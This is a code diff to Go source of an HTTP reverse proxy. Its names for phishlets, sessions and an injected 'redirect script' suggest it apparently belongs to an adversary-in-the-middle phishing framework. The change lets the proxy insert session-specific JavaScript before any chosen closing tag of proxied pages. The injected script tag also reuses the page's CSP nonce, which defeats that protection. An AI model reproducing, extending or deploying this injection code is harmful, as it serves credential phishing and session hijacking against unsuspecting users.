@@ -1177,13 +1177,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								js_params = &s.Params
 							}
 							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
-							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
+							js_id, _, location, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id), location)
 							}
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id), location)
 						}
 					}
 				}
@@ -1331,14 +1331,14 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 	return req, nil
 }
 
-func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
+func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string, location string) []byte {
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
 	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
 	js_nonce := ""
 	if m_nonce != nil {
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
 	}
-	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	re := regexp.MustCompile(`(?i)(<\s*/`+regexp.QuoteMeta(location)+`\s*>)`)
 	var d_inject string
 	if script != "" {
 		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
